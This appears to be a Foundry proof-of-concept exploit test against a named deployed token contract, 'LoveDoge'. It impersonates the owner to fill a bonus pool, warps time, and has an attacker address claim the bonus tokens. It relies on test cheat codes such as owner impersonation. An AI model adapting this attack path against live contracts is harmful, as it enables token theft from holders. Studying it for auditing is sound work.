pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyCoinToken {
    function sumTheBounsPool(string memory yesToday, string memory twoYesToday) external;
    function receiveBounsToken() external returns (uint256);
    function setBounsTime(uint256 timestamp) external;
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function getDays() external view returns (string memory, string memory);
    function bounsTime() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);
    IMyCoinToken target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMyCoinToken(TARGET);
        owner = target.owner();
        vm.label(TARGET, "LoveDoge");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");

        // Deal tokens to attacker (need at least minBounsJoin = 100000000000 * 10^9 with 9 decimals)
        deal(TARGET, attacker, 1000000000000 * 1e9);

        // Deal tokens to contract to fund the bonus pool
        deal(TARGET, TARGET, 1000000000000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = target.balanceOf(attacker);

        // Get the date strings for yesterday and two days ago
        (string memory yesToday, string memory twoYesToday) = target.getDays();

        // Impersonate owner to call sumTheBounsPool and populate the bonus pool
        // Contract already has tokens from deal() in setUp
        vm.startPrank(owner);
        target.sumTheBounsPool(yesToday, twoYesToday);
        vm.stopPrank();

        // Warp time to ensure bounsTime condition is met (bounsTime = 1625068800)
        vm.warp(1700000000);

        // Attacker claims bonus tokens (no outgoing transfer, only incoming)
        vm.startPrank(attacker);
        target.receiveBounsToken();
        vm.stopPrank();

        // Verify attacker's balance increased
        uint256 finalBalance = target.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from bonus");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

